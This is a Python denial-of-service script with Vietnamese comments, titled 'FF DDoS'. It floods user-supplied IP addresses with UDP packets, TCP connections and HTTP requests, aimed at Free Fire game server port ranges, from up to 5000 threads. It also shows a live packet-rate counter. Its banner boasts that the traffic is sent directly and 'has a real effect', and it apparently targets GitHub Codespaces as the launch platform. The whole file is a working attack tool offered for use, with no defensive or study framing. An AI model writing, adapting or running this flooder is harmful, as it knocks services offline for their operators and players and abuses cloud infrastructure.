# ============================================
# FF DDoS - CODESPACE GITHUB MODE
# GIỐNG HÔM QUA - KHÔNG FAKE IP/THIẾT BỊ
# GỬI TRỰC TIẾP - CÓ TÁC DỤNG THẬT
# ============================================

import socket
import time
import threading
import os
import random
import sys
from datetime import datetime

# ============================================
# PORT GAME FREE FIRE
# ============================================
FF_PORTS = []
for start, end in [
    (10000, 10100), (17000, 17100), (17500, 17600),
    (18000, 18100), (19000, 19100), (19500, 19600),
    (20000, 20100), (21000, 21100), (21500, 21600),
    (22000, 22100), (23000, 23100), (25000, 25100),
    (27000, 27100), (28000, 28100), (30000, 30100),
    (35000, 35100),
]:
    FF_PORTS.extend(range(start, end))

# ============================================
# ENGINE ĐƠN GIẢN - GIỐNG HÔM QUA
# ============================================
class SimpleEngine:
    def __init__(self):
        self.targets = []
        self.running = False
        self.packets = 0
        self.errors = 0
        self.lock = threading.Lock()
    
    def inc(self, n=1):
        with self.lock: self.packets += n
    def err(self):
        with self.lock: self.errors += 1
    def get(self):
        with self.lock: return self.packets, self.errors

    def _udp_worker(self, tid):
        """Mỗi thread 1 socket riêng"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.settimeout(0.3)
        except:
            return
        
        data = os.urandom(2048)
        count = 0
        idx = tid
        
        while self.running and count < 50000:
            try:
                ip = self.targets[idx % len(self.targets)]
                port = FF_PORTS[idx % len(FF_PORTS)]
                idx += 1
                
                for _ in range(20):
                    s.sendto(data, (ip, port))
                    self.inc()
                    count += 1
                    
            except:
                self.err()
        
        s.close()

    def _tcp_worker(self, tid):
        """TCP SYN"""
        count = 0
        idx = tid
        
        while self.running and count < 30000:
            s = None
            try:
                ip = self.targets[idx % len(self.targets)]
                port = FF_PORTS[idx % len(FF_PORTS)]
                idx += 1
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.settimeout(0.2)
                s.connect_ex((ip, port))
                s.send(os.urandom(256))
                self.inc()
                count += 1
                
            except:
                self.err()
            finally:
                if s:
                    try: s.close()
                    except: pass

    def _http_worker(self, tid):
        """HTTP Flood đơn giản"""
        count = 0
        idx = tid
        
        while self.running and count < 20000:
            s = None
            try:
                ip = self.targets[idx % len(self.targets)]
                port = random.choice([80, 443, 8080])
                idx += 1
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.settimeout(0.3)
                s.connect_ex((ip, port))
                
                req = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {ip}\r\n"
                    f"User-Agent: FreeFire/1.107.1\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                )
                s.send(req.encode())
                self.inc()
                count += 1
                
            except:
                self.err()
            finally:
                if s:
                    try: s.close()
                    except: pass

    def _batch_manager(self, total_threads, worker_func):
        """Tạo thread theo batch 200"""
        batch_size = 200
        created = 0
        
        while self.running and created < total_threads:
            batch = min(batch_size, total_threads - created)
            
            for i in range(batch):
                t = threading.Thread(
                    target=worker_func,
                    args=(created + i,),
                    daemon=True
                )
                t.start()
                created += 1
            
            if created < total_threads:
                time.sleep(0.1)

    def start(self, targets, threads, udp, tcp, http):
        if self.running:
            self.stop()
            time.sleep(0.3)
        
        if not targets:
            return 0
        
        self.targets = targets
        self.running = True
        self.packets = 0
        self.errors = 0
        
        total = 0
        
        if udp:
            n = int(threads * 0.5)
            t = threading.Thread(target=self._batch_manager, args=(n, self._udp_worker), daemon=True)
            t.start()
            total += n
        
        if tcp:
            n = int(threads * 0.3)
            t = threading.Thread(target=self._batch_manager, args=(n, self._tcp_worker), daemon=True)
            t.start()
            total += n
        
        if http:
            n = int(threads * 0.2)
            t = threading.Thread(target=self._batch_manager, args=(n, self._http_worker), daemon=True)
            t.start()
            total += n
        
        return total

    def stop(self):
        self.running = False


def print_banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(f"""
    ╔══════════════════════════════════════════╗
    ║  ☠ FF DDoS - CODESPACE MODE ☠        ║
    ║  GIỐNG HÔM QUA - CÓ TÁC DỤNG         ║
    ║  KHÔNG FAKE - GỬI TRỰC TIẾP          ║
    ╚══════════════════════════════════════════╝
    """)

def main():
    print_banner()
    
    # IP
    print("  [+] NHẬP IP MỤC TIÊU:")
    ip_input = input("\n  >> ").strip()
    if not ip_input:
        print("  [-] CHƯA NHẬP IP!")
        return
    
    targets = [t.strip() for t in ip_input.replace(',', ' ').split() if t.strip()]
    if not targets:
        print("  [-] KHÔNG CÓ IP!")
        return
    
    # Threads
    print(f"\n  [+] SỐ THREADS (mặc định 1000):")
    try:
        threads = int(input("  >> ").strip() or "1000")
        if threads > 5000:
            threads = 5000
    except:
        threads = 1000
    
    # Mode
    print(f"\n  [+] CHẾ ĐỘ:")
    print(f"      1. UDP+TCP+HTTP")
    print(f"      2. UDP ONLY")
    print(f"      3. TCP ONLY")
    mode = input("  >> ").strip() or "1"
    
    udp = mode in ['1', '2']
    tcp = mode in ['1', '3']
    http = mode in ['1']
    
    print(f"\n  [☠] KHỞI ĐỘNG {threads} THREADS...")
    print(f"  [!] Tạo theo batch 200...")
    
    engine = SimpleEngine()
    total = engine.start(targets, threads, udp, tcp, http)
    
    if not total:
        print("  [-] LỖI!")
        return
    
    start_time = time.time()
    print(f"  [✅] ĐÃ LÊN LỊCH {total} THREADS!")
    print(f"  [🎯] {len(targets)} IP | UDP:{udp} TCP:{tcp} HTTP:{http}")
    print(f"\n  ╔══════════════════════════════════╗")
    print(f"  ║  ENTER = DỪNG                  ║")
    print(f"  ╚══════════════════════════════════╝")
    
    monitor_run = True
    def monitor():
        while monitor_run and engine.running:
            packets, errors = engine.get()
            elapsed = time.time() - start_time
            pps = packets / elapsed if elapsed > 0 else 0
            m, s = divmod(int(elapsed), 60)
            print(f"\r  [📊] GÓI: {packets:,} | {pps:,.0f}/s | LỖI: {errors} | {m:02d}:{s:02d}  ", end='')
            time.sleep(0.3)
    
    threading.Thread(target=monitor, daemon=True).start()
    input()
    
    engine.stop()
    monitor_run = False
    time.sleep(0.5)
    
    packets, errors = engine.get()
    elapsed = time.time() - start_time
    pps = packets / elapsed if elapsed > 0 else 0
    m, s = divmod(int(elapsed), 60)
    
    print(f"""\n
    ╔══════════════════════════════════════════╗
    ║           KẾT THÚC                       ║
    ╠══════════════════════════════════════════╣
    ║  TIME:  {m:>2}p {s:>2}s                      ║
    ║  GÓI:   {packets:>10,}                    ║
    ║  TỐC ĐỘ:{pps:>10,.0f}/s                    ║
    ║  LỖI:   {errors:>10,}                    ║
    ║  THREAD:{total:>10}                    ║
    ╚══════════════════════════════════════════╝
    """)
    input()

if __name__ == '__main__':
    main()
